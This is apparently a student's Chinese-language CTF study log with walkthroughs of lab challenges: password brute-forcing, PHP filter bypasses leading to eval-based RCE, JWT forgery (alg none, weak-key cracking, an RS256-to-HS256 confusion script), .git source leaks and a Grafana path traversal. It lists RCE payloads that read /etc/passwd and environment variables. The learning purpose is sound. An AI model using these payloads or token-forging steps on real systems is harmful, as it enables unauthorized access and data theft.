# Week-3
+ ID: trke
+ 日期：2026-11-01

# 弱口令与默认口令
1. [[LitCTF 2025]nest_js ](https://www.nssctf.cn/problem/6786)

### [LitCTF 2025]nest_js 思路
使用 dirsearch 工具扫描未发现隐藏文件，故尝试 BP 抓包爆破

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/a6673140-df5f-4cfc-8bd0-ba0bf196aa14)

抓包发送到 intruder 尝试爆破密码

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/9dd9d8a0-2033-4757-859e-a46e37e31f0d)

提示弱口令，则将 username 改为 admin ，对密码位置添加 pyload，并导入字典开始攻击

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/d66fe2c6-d6de-4a03-a4c5-6f07901032f5)

可见 password 处页面响应为 200 ，尝试登录，成功拿到 flag

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/019a6221-2654-42cf-885a-5e128e184a3f)

### 总结
+ 学会使用 dirsearch 扫描，比如命令：dirsearch -u 网址 ，curl 网址 -O（保存隐藏文件/在浏览器直接访问也可以）
+ 学会用 BP上的 intruder 模块进行爆破，抓包发送 intruder ，添加 pyload , 导入字典，开始攻击



2. [[SWPUCTF 2025 秋季新生赛]DANGEROUS TRIAL](https://www.nssctf.cn/problem/7208)

### [SWPUCTF 2025 秋季新生赛]DANGEROUS TRIAL思路
打开靶机，发现是一个登录框，看源码未发现提示，尝试dirsearch扫描

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/fa3cdf56-67e7-44ea-96e0-8d9cac48b8f6)

用dirsearch扫描，发现一份压缩文件，下载解压发现是一份密码字典, 尝试爆破

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/f4408c38-03fa-4b27-b48b-353aeba726ed)

抓包发送到intruder，添加pyload，导入hello.txt，开始攻击

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/7cc806a9-ec78-4e77-9890-c506fd6448e1)

按状态码排序，发现输入正确账密后重定向

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/5da1a0dc-365b-4245-9bb3-f22742edbaca)

发包发现网页返回源码提示，再次抓包发送到repeater

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/750b82d9-485e-4b76-b0fe-081f8639b91d)

发现题目可细分为三个部分，解决部分1-GET传参，发现intval是截断函数，读到第一个不为数字的参数就截断，同时又不能等于114514，故可传入 &cat=114514a 等触发截断的值

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/b7309a73-96fc-4a47-bec6-b1ba2c974447)

解决部分2-GET传参，根据页面最顶提示，对rimuru进行base64编码，发现为cmltdXJ1，刚好满足$pt的substr截取规则，又有file_get_contents函数对内容判断，可以用data伪协议绕过，构造text/plain：&Slime=data://text/plain;base64,cmltdXJ1,成功完成绕过

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/c951b124-428a-43d2-80e8-6ae605acc6ba)

解决部分3-POST传参，改GET为POST，添加POST请求传参方式：Content-Type: application/x-www-form-urlencoded，发现参数名为NSS_CTF.LOVE,PHP后端会自动将特殊字符转为_（参数名污染），故变形为：NSS[CTF.LOVE，使其识别为数组得以保留“.”,构造无参数rce绕过正则匹配：NSS[CTF.LOVE=<font style="color:rgb(48, 49, 51);">eval(end(current(get_defined_vars())));末尾传入参数对应系统命令实现远程代码执行</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/6f4bd396-bfc5-4c48-a687-f9868de22e05)

<font style="color:rgb(48, 49, 51);">检查这些文件发现没有flag ，检查环境变量：a=system('env')无结果,尝试查看/flag，成功拿到flag</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/8e4def42-e2fe-40c2-80b9-769b4c3431a7)

### 总结
+ php中intval()函数有数字截断的效果，读到第一个不是数字的字符时截断。

> `<font style="color:rgb(48, 49, 51);background-color:rgba(27, 31, 35, 0.05);">intval()</font>`<font style="color:rgb(48, 49, 51);">：截断小数，直接取整</font>
>
> `<font style="color:rgb(48, 49, 51);background-color:rgba(27, 31, 35, 0.05);">round()</font>`<font style="color:rgb(48, 49, 51);">：四舍五入</font>
>
> `<font style="color:rgb(48, 49, 51);background-color:rgba(27, 31, 35, 0.05);">floor()</font>`<font style="color:rgb(48, 49, 51);">：向下取整</font>
>
> `<font style="color:rgb(48, 49, 51);background-color:rgba(27, 31, 35, 0.05);">ceil()</font>`<font style="color:rgb(48, 49, 51);">：向上取整</font>
>

+ substr()函数会截取字符串，正如题目中substr($pt,-3)即为拿到$pt的后三个字符，file_get_contents()函数拿到$pt值对其内容进行判断，可以利用data伪协议绕过
+ GET改POST请求时要加上请求方式，比如最常见的表单方式：Content-Type: application/x-www-form-urlencoded
+ php参数名污染：可以将NSS_CTF.LOVE改为NSS[CTF.LOVE绕过，这样后端相当于拿到['NSS'][ 'CTF.LOVE']这样“.”就得以保留
+ 正则匹配{'/[^\W]+\((?R)?\)/'}, [^\W]+：匹配单词字符/函数名字符串，(?R)递归正则本身，故构造无参rce
+ eval(end(current(get_defined_vars())));

> get_defined_vars()：拿到作用域变量的全局传参数组
>
> current()：取出POST的参数组
>
> end()：将指针指向最后的参数
>
> eval()：将参数的值当作php代码执行
>

+ 常见rce命令：

> system('ls -a'), system('cat /flag'), system('ls /'), system('cat /etc/passwd'), system('cat /etc/hosts'), system('cat /etc/profile'), system('echo $PATH'), system('ls / | grep flag')
>
> var_dump(getenv()), phpinfo(), highlight_file('/flag')等
>



# JWT
1.[敏感信息泄露](https://www.ctfhub.com/#/skilltree)

### 敏感信息泄露思路
拿到题目，尝试常见密码 admin/123456 登录成功<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/838f1537-c704-4868-b9a5-3b548ffc7dee)

打开 BP 抓包，查看 Token 中是否有敏感信息

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/8b2f5146-93ab-4565-a4b7-3bea2e6054d6)

复制 Token 使用 jwt_tool 工具对其进行扫描解密

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/4b8e460c-ee1f-4e4f-acd5-259b5a1dd178)

可见 "FL  " 和 "AG" 字样，拼起来成功拿到 FLAG

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/cdc3afdf-dccc-4fff-9ce5-370dd10ad98f)

### 总结
1. 理解 JWT 的作用和构成：

> JWT 是用于网络身份认证的令牌，由**头部 (header)、载荷 (payload)、签名 (signature)**三段 base64 串用点分隔组成，服务端通过签名校验完整性，传递用户身份信息，签名可使用不同算法加密。
>

2. 学会 JWT_Tool 的常见命令使用
+ 攻击可视化

```shell
python3 jwt_tool.py <TOKEN> -T
```

+ 基础解码查看token信息

```shell
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

+ 全套漏洞自动扫描（离线检测：none、算法混淆、kid注入、弱密钥）

```shell
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -M at
```

+ 同时改多个字段示例：role=admin，username=super

```shell
jwt_tool <TOKEN> -I -pc role -pv admin -pc username -pv super
```

+ 爆破HS256密钥

```shell
python3 jwt_tool.py <TOKEN> -C -d rockyou.txt
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/86c9f0ba-9d20-489b-ad10-1432c702c8bf)



2. [无签名](https://www.ctfhub.com/#/skilltree)

### 无签名思路
拿到题目，依旧尝试常见密码 admin/123456 登录成功<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/838f1537-c704-4868-b9a5-3b548ffc7dee)

提示需要管理员身份才能拿到 flag，果断抓包拿 Token

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/80bb8b8c-cf8d-4405-b167-ed450350845c)

-T 可视化修改 alg 为 none，修改 role 为 admin ，绕过验证

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/4cd12a58-fa39-4bbe-ae51-706d3aadb019)

改完后得到新 Token ，接着手动去除签名

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/69ef04b0-1269-4411-a805-4bf1e37dc15c)

改 Token 发包得到 flag

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/3fbae9f8-4679-4efb-a191-2a4c584b4c2f)

### 总结
学会 JWT_tool 的可视化命令，以及分析问题的能力



3. [弱密钥](https://www.ctfhub.com/#/skilltree)

### 弱密钥思路
拿到题目，依旧尝试常见密码 admin/123456 登录成功

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/80bb8b8c-cf8d-4405-b167-ed450350845c)

dirsearch 扫描没有发现现成的字典，则使用1–4 位小写字母+数字穷举法，成功命中xkcv

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/96cd7d76-8a44-4a57-8a3c-e9ba2a0777ba)

接着改 role: admin，用 xkcv 重签 HMAC-SHA256，更新 Token，成功拿到 flag

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/b573ed48-b36b-4952-ad2e-ec612037f976)

### 总结
熟练使用 jwt_tool，理解各个命令的含义

```shell
  Step 1 · 解析 token
  jwt_tool "<JWT>"
  输出 Header / Payload / Signature 的明文，确认有 "role":"guest"。

  Step 2 · 爆破密钥
  jwt_tool 的 -C 只支持字典，所以弱密码1–4 位小写字母+数字穷举字典：
  jwt_tool "<JWT>" -C -d "D:/Sec_tool/Sec_Wordlists/07_jwt/jwt_keyspace_1to4_lower_digit.txt"
  示例输出：[+] xkcv is the CORRECT key!

  Step 3 · 改 claim 并重签
  python jwt_tool.py "<JWT>" -I -pc role -pv admin -S hs256 -p xkcv -b
  - -I 注入 claim，-pc 指定 claim 名，-pv 指定新值
  - -S hs256 指定算法，-p xkcv 指定密钥
  - -b 只输出 token 本体，方便复制

  Step 4 · 发送到目标
  python jwt_tool.py "<JWT>" -I -pc role -pv admin -S hs256 -p xkcv \
    -t "http://<沙箱地址>/index.php" \					-t 目标 URL
    -rc "token=<JWT>" \					-rc 把原 token 放在 cookie 里，jwt_tool 会自动替换
    -np -cv "ctfhub{"					-np 绕过本地代理（Steam++ 可能抢代理） -cv "ctfhub{" 把响应里含 flag 的行高亮出来
```



4. [修改签名算法（算法混淆）](https://www.ctfhub.com/#/skilltree)

### 修改签名算法（算法混淆）思路
打开靶机，发现公钥获取人口：publickey.pem和登录框

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/37d5bca7-d622-401a-8cca-4cd00a9145d2)

打开publickey.pem，获取公钥，抓包查看Token

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/d426c65d-3a04-47b4-9084-0f3c3876a87b)

使用 jwt_tool 进行查看并改“RS256”为"HS256"，改role为“admin”进行绕过

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/50386b23-8c9d-476f-af3d-f4b4a3aa0be3)

绕过后利用手写的解密公钥的py脚本进行Token生成，尝试不同版本并替换

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/d616cb54-68a7-4fad-a91d-a3e0ffe13066)

使用脚本命令：python jwt_alg_confusion.py

```python
import base64
import hashlib
import hmac

B64 = ("输入公钥")

SIGNING_INPUT = ("头部）" # 指定算法与类型
                 ".载荷") # 储存用户信息身份


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def pem_body(width: int = 64) -> str:
    return "\n".join(B64[i:i + width] for i in range(0, len(B64), width))


# Every plausible byte-string a server might feed to HMAC as the "secret".
candidates = [
    ("1. raw base64 body (no newlines)", B64),
    ("2. PEM, 64-char lines, LF, trailing NL",
     "-----BEGIN PUBLIC KEY-----\n" + pem_body() + "\n-----END PUBLIC KEY-----\n"),
    ("3. PEM, 64-char lines, LF, no trailing NL",
     "-----BEGIN PUBLIC KEY-----\n" + pem_body() + "\n-----END PUBLIC KEY-----"),
    ("4. PEM, 64-char lines, CRLF, trailing CRLF",
     "-----BEGIN PUBLIC KEY-----\r\n" + pem_body().replace("\n", "\r\n")
     + "\r\n-----END PUBLIC KEY-----\r\n"),
    ("5. raw DER bytes (decoded)", None),
    ("6. base64 with trailing '=' padding", B64),
]

for label, secret in candidates:
    if label.startswith("5."):
        key = base64.b64decode(B64)
    elif label.startswith("6."):
        key = base64.b64encode(base64.b64decode(B64))
    else:
        key = secret.encode()

    sig = hmac.new(key, SIGNING_INPUT.encode(), hashlib.sha256).digest()
    print("=" * 78)
    print(label, "   (secret length = %d bytes)" % len(key))
    print("-" * 78)
    print(SIGNING_INPUT + "." + b64url(sig))
    print()
```

替换Token，成功拿到 flag

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/73956f3c-52e9-43fb-a16e-144ad6e03d36)

### 总结
学会查看源码并分析漏洞类型，准确解密公钥，混用 alg

1. RSA 是**非对称加密算法(RSA-SHA256, 即RS256)**，一对密钥：
+ 🔐 **私钥 private key**：自己藏好，用来**签名**（这道题登录的时候，服务器用私钥签 JWT）
+ 🔓 **公钥 public key**：可以公开给所有人，用来**验签**
2. MAC 是**对称签名算法（HMAC-SHA256，即HS256）**：
+ 对称 = **只有一把密钥（secret）**，签名和验签用同一个 secret。
3. <font style="color:#000000;background-color:rgba(255, 255, 255, 0);">firebase/jwt 是 PHP 生态里面最流行的 JWT 库，全名 firebase/php-jwt,旧版本允许RS,HS混用</font>



# session值初步
### 认识 session 值
+ [今日头条应用文章](https://www.toutiao.com/article/7613294594511454746/?wid=1793116155510)（CSDN链接：[https://blog.csdn.net/xike1024/article/details/148653186](https://blog.csdn.net/xike1024/article/details/148653186)）

> **<font style="color:#585A5A;">Session</font>****<font style="color:rgb(77, 77, 77);">攻击</font>**<font style="color:rgb(77, 77, 77);">是Web安全中针对用户会话（Session）的常见攻击手段，攻击者通过窃取、伪造或操纵Session来非法获取用户权限，执行未授权操作。</font>
>
> ### <font style="color:rgb(34, 34, 38);">Session劫持</font>
> <!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/e8935836-4c99-4193-a81a-29a926367b75)
>
> ### <font style="color:rgb(34, 34, 38);">Session固定攻击</font>
> + **<font style="color:rgb(77, 77, 77);">原理：</font>**<font style="color:rgb(77, 77, 77);">强迫用户使用攻击者预设的Session ID</font>
> + **<font style="color:rgb(77, 77, 77);">步骤：</font>**
> 1. 攻击者访问网站获取Session ID：SID=1234abcd。
> 2. 构造钓鱼链接：[https://victim-site.com/login?SID=1234abcd](https://victim-site.com/login?SID=1234abcd)
> 3. 用户点击链接并登录，服务器将Session ID与账户绑定。
> 4. 攻击者使用SID=1234abcd直接访问用户账户
>
> ### <font style="color:rgb(34, 34, 38);">Session篡改</font>
> ##### 原理：修改Session数据以提升权限或绕过验证。
> 攻击方式：
>
> 篡改Session中的用户角色字段（如role=admin）。
>
> 修改身份验证状态（如is_logged_in=1）。
>
> ### Session攻击防护
> HTTPS + Secure Cookie	防网络嗅探
>
> HttpOnly + CSP		防XSS窃取Session ID
>
> 登录重置Session ID		防Session固定
>
> 短超时 + 自动注销		降低会话暴露风险
>
> CSRF Token			防跨站请求伪造
>
> 绑定IP/User-Agent		增加会话仿冒难度
>



# git仓库与git泄露 [原文](https://blog.csdn.net/m0_67170526/article/details/145101563)
已在 kali 安装 GitHack 工具，使用方式：

打开文件夹右键进入 终端 开始使用

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/281e4aac-2e85-4c63-9143-2d6e4dc7d46c)

1. Git（<font style="color:rgb(77, 77, 77);">分布式版本控制系统</font>） 常见命令

```plain
git status                  # 查看文件状态
git log                     # 查看提交记录
git diff                    # 查看文件改动
git show <commit-id>        # 查看某次提交的代码
git remote -v							  # 显示当前项目的远程仓库信息
git pull										# 从远程仓库拉取最新的更改并自动合并到本地当前分支
git push										# 确保本地分支与远程分支一致后，执行本地分支推送操作
git add && git commit				# 添加文件和提交文件
```

类型：<font style="color:rgb(34, 34, 38);">常规 Git 泄露，Git 回滚，Git 分支，Git 日志，Git 配置文件，Git 索引文件，Git 钩子脚本，Git对象</font>

2. CTF 实际应用
+ <font style="color:rgb(77, 77, 77);">首先使用dirsearch进行网站扫描，发现有 .git 文件泄露的可能</font>

```shell
dirsearch.py -u URL -e*
```

+ <font style="color:rgb(77, 77, 77);">使用githack来恢复源代码，存储在 dist 目录</font>

```shell
python2 GitHack.py http://challenge-3af067339f2e185f.sandbox.ctfhub.com:10800/.git
```

+ <font style="color:rgb(77, 77, 77);">然后进入获取的文件夹在里面运行终端</font>

> <font style="color:rgb(77, 77, 77);">使用 git log 查看最新提交历史后</font>
>
> + <font style="color:rgb(77, 77, 77);">可以 git show 查看最近一次提交，过往修改查看 git show <添加flag时的版本hash></font>
> + <font style="color:rgb(77, 77, 77);">可以 git diff 比较不同版本的差异，语法为git diff <commit1> <commit2></font>
> + <font style="color:rgb(77, 77, 77);">可以使用 git 回滚，将版本回退至删除flag之前的版本：git reset --hard <commit>（会新增回退之前修改的日志文件）</font>`<font style="color:rgb(77, 77, 77);"></font>`
>

+ 以上均未发现，则可能在暂存区：

<font style="color:rgb(77, 77, 77);">git stash：保存当前工作目录的更改（暂存不合并）</font>

<font style="color:rgb(77, 77, 77);">git checkout hotfix：切换到 hotfix 分支进行一项紧急工作</font>

<font style="color:rgb(77, 77, 77);">git stash pop：恢复保存的更改</font>

1. [Git 泄露-log](https://www.ctfhub.com/#/skilltree)

### Git 泄露-log思路
打开靶机，查看源码未发现线索

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/61296608-8730-440e-a101-2a95b88503f3)

尝试用 dirsearch 扫描，发现有可能存在 git 泄露

`dirsearch -u http://challenge-7bf5220a30ea2ad3.sandbox.ctfhub.com:10800/`

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/d1126d85-f20d-40ad-a6c9-a8099df0e0a6)

尝试用 GitHack 进行源码抓取：

`python2 GitHack.py http://challenge-7bf5220a30ea2ad3.sandbox.ctfhub.com:10800/.git`

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/5e3cefc9-dc68-4dce-b12d-c2518fdd5a58)

成功拿到源码，dist位置打开终端，使用`git log 与 git show `查看修改记录，发现 flag

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/df063cce-52f3-4a16-a81e-372efed73deb)

### 总结
学会用 Githack 抓取源码并用 git 命令查看修改记录



2. [Git 泄露-stash](https://www.ctfhub.com/#/skilltree)

### Git 泄露-stash思路
打开靶机，查看源码未发现线索

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/66ba2b76-b215-4ba3-ab83-2e6baa261805)

尝试用 dirsearch 扫描，发现有可能存在 git 泄露

`dirsearch -u http://challenge-68a44eb7223e5006.sandbox.ctfhub.com:10800/`

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/683211bc-e4e5-4bfb-861a-d5b68ab989b0)

使用 GitHack 获取源码

python2 GitHack.py http://challenge-68a44eb7223e5006.sandbox.ctfhub.com:10800/.git

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/807372e1-611c-4d6d-805d-38a3a0be84ce)

执行 git log 或 git show 无内容，尝试从暂存区查看执行命令：

git stash pop

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/229af321-e687-445a-84d1-72c78a5c98c2)

成功拿到一个 .txt 文件，返回 dist 目录查看，发现 flag 就藏在这里

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/0eaa5d44-3a45-40ff-949a-5e3544f6ab92)

### 总结
学会查看暂存区的文件，正确使用命令



3. [Git泄露-index-略](https://www.ctfhub.com/#/skilltree)

步骤同上，dirsearch 扫描，GitHack 抓取即可

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/6ea032fe-141a-497d-b2bf-1ecfc14ecfbe)



# CVE 漏洞搜集
1.[CVE-2021-43798](https://www.nssctf.cn/problem/1139)

> + <font style="color:rgb(48, 49, 51);">简介：Grafana 存在未授权任意文件读取漏洞-攻击者可以通过将包含特殊目录便利字符序列(../)的特制HTTP请求发送到受影响的设备来利用此漏洞，成功利用该漏洞的攻击者可以在目标设备上查看文件系统上的任意文件。</font>
> + <font style="color:rgb(48, 49, 51);">原理：Grafana 的路由规则（路由是 </font>**URL 地址 → 对应后端代码函数**<font style="color:rgb(48, 49, 51);"> 的映射表）：</font>
>

```plain
/public/plugins/:pluginId/*
```

> 其中`/public/plugins/`为固定前缀，URL中必须存在
>
> `:pluginId`为路径参数，捕获这一段内容（比如welcone）赋值给 pluginId，校验 welcome 插件是否存在
>
> `*`是通配符，将后面内容交给 restPath 变量。但后方路径没有做检查 ! ! !
>
> `getPluginAssets(pluginId, restPath)`, 此函数负责做校验
>

```plain
路由思想与编程语言无关，但路由写法、符号：由 Web 框架决定
比如 Grafana 用的是 GO 的 Gin 框架
GO 的 Gin 框架常见的路由：
· /public/plugins/:pluginId/*，/public/img/* 等等的静态资源
· /login 登录页，/api/users 用户管理
· /robots.txt 君子协议，规定爬虫行为
```

CVE-2021-43798 复现：

<!-- 这是一张图片，ocr 内容为： -->
![](https://github.com/user-attachments/assets/e7cd276c-3f8f-4378-b6c0-a22e8733255f)

# PHP语言的特性
变量，比较，逻辑运算，输出

```php
<?php  
$x_int = 1024;   #变量：变量类型以及定义变量名需要以$开头，弱类型语言，不必向其声明数据类型
$y_int = 0xFFF; 
$float_num = 1.5;
$txt_string = "Hello CTF!";
$stat_Boolean = true; # 比较：“==”仅比较值，“===”即比较值又比较类型
$a = 1;
$b = 0;		# 输出：echo可以输出一个或多个字符串;print只允许输出一个字符串，返回值总为 1
echo $a||$b   # 逻辑运算： and/&&:与, or/||:或, xor:异或, !:非 
?>
```

数组，魔术常量

```php
<?php
$cars=array("Hello","CTF"); # array 创建数组
echo "I like " . $cars[0] . " " . $cars[1] . ".";
$z = ['H','e','l', 'l', 'o']; # []来定义数组
$z[0] = 'H';
$z[1] = 'e';
$z[2] = 'l';
$z[3] = 'l';
$z[4] = 'o';
# 魔术常量：
# __FILE__ //返回文件的完整路径和文件名
# highlight_file(__FILE__); //代码高亮的显示当前文件内容
?>
```

传参，常见函数

```php
$_GET['book'] # 使用GET请求传参，参数名：book
$_POST['book'] # 使用POST请求传参，参数名：book
$_REQUEST['key'] # 接受 GET 和 POST 以及 Cookie 请求传递的参数，参数名为key
文件操作函数：
include(): 导入并执行指定的 PHP 文件
  include('config.php'); 会导入并执行 config.php 文件中的代码
    require(): 类似于 include()，但如果文件不存在，严重报错，停止向下执行
      include_once(), require_once(): 与 include 和 require 类似，但只导入文件一次
fopen(): 打开一个文件或 URL
  $file = fopen("test.txt", "r"); 会以只读模式打开 test.txt
file_get_contents(): 读取文件的全部内容到一个字符串
  $content = file_get_contents("test.txt");
file_put_contents(): 将一个字符串写入文件
  file_put_contents("test.txt", "Hello World!");

代码执行函数：
eval(): 执行字符串中的 PHP 代码
  eval('$x = 5;'); 会设置变量 $x 的值为 5。
assert(): 用于调试，检查一个条件是否为 true。
system(), shell_exec(), exec(), passthru(): 执行外部程序或系统命令
  system("ls"); 会执行 ls 命令并显示输出

反序列化函数：
unserialize(): 将一个已序列化的字符串转换回 PHP 的值
  $array = unserialize($serializedStr); 可以将一个序列化的数组字符串转换为数组

数据库操作函数：
mysql_query(), mysqli_query(): 发送一个 MySQL 查询
  $result = mysql_query("SELECT * FROM users");

其他函数：
preg_replace(): 执行正则表达式搜索和替换
  $newStr = preg_replace("/man/i", "baby", $str); 会将 $str 中的 "man" 替换为 "baby"
create_function(): 创建匿名的 lambda 函数
  $func = create_function('$x', 'return $x + 1;');
// PHP7.1+ 不传参数，返回全部环境变量数组
var_dump(getenv());
// 看全部配置
phpinfo();
```



# RCE：代码/命令执行
> RCE（Remote Code Execution，远程代码执行）是指攻击者能够在目标服务器上执行任意代码的一种高危安全漏洞，结合linux基础指令，简单来说就是在对方电脑上拿到权限、执行这些指令。
>

> ![](https://github.com/user-attachments/assets/a4d57432-a231-49ff-a702-337d0459f0c4)
>
> + 命令执行函数具体介绍：
>

```php
直接回显（exec完整回显需传入数组变量承载):
system(); # 传入Linux 命令并执行，比如"ls","cat /flag"
exec(); # 单参数只回显最后一行，故需要传入承载数组变量:
  exec(ls,$wen);var_dump($wen);/print_r($wen);方可全部回显
passthru(); # 输出二进制数据流，但命令执行与system()函数效果相同
无直接回显：
shell_exec(); # 执行的命令需用echo打印，如：echo shell_exec('pwd');
popen(); # 读r写w popen(ls /,'r');-->拿到 fread();/fgets();-->打印 echo/print_r();
proc_open();参数更多，更为复杂
```

> + 值得注意的是，PHP 里，**被一对反引号包起来的内容，会交给系统 shell 去执行**，等价于 `shell_exec()`！比如：echo `pwd`;和echo shell_exec('pwd');等效
>

> + Linux操作系统连接符
>

```php
分号";" -- 如pwd;ls # 不管前面执行情况，后面一定执行
逻辑与&& -- 如pwd&&ls # 前面命令执行成功（返回码 0），才执行后面
逻辑或|| -- 如pwd||ls # 前面命令失败，才执行后面
后台符&，需url编码为%26 -- 如sleep 10%26ls # 把前面命令丢后台运行，立刻执行后面，不等前面结束
管道符（pipe）| -- 如ls /|grep flag # 把前一条命令的输出，当成后一条命令的输入
```

> 例如：
>

> ![](https://github.com/user-attachments/assets/87cbbaa1-c043-4508-8859-db7d218e6780)
>



### RCE-labs-1思路
提示POST传参，抓包添加表单类型

![](https://github.com/user-attachments/assets/2c1ae6d7-6b49-4d5e-bd9e-0c355e933de0)

a=system('ls /')看到根目录下有一个flag文件，传入参数a，当作PHP代码执行，拿到flag

![](https://github.com/user-attachments/assets/5af8e9c5-6513-4403-84bd-4c3b82f45b5d)

### 总结
```php
PHP 命令执行常见获取信息的函数/命令
a=print_r(scandir('.')); //列出当前所有文件和文件夹，../为上一级目录
a=system('ls -la'); // 详细信息（权限、时间等）
a=system('ls /'); // 查看根目录文件有哪些
a=echo getcwd(); a=echo __DIR__; //查看当前脚本绝对路径
a=echo file_get_contents("get_flag.php"); 
a=echo file_get_contents("/etc/passwd"); 
a=echo file_get_contents('php://filter/read=convert.base64encode/resource=get_flag.php');// 读取源码
a=include("get_flag.php"); //引入执行文件
a=phpinfo(); //查看PHP配置信息
a=var_dump(getenv());
a=echo getenv("PATH"); // 查看环境变量
```

### RCE-labs-3思路
提示POST传参，抓包添加表单类型

![](https://github.com/user-attachments/assets/ff86cd1a-5957-4810-b398-350c3f95d8c4)

ls当前文件只有index.php,用ls /查看根目录文件，发现flag文件

![](https://github.com/user-attachments/assets/e0a24bd0-7b5e-47a4-86f4-f79519963a23)

传入参数a，当作Linux命令执行，拿到flag

![](https://github.com/user-attachments/assets/5e6e9c07-2110-4f02-9c1f-3ccaf4c1379c)

### 总结
```php
Linux 命令执行常见获取信息的函数/命令
a=ls -la; # 看当前目录有什么
a=env; # 打印全部环境变量
a=pwd; # 输出当前工作目录的路径
a=ls /; # 查看根目录文件
a=cat /flag; # 查看根目录下的flag文件，也可以多级查看一步步找如：cat /etc/passwd
  POST表单数据：Content-Type:application/x-www-form-urlencoded
```
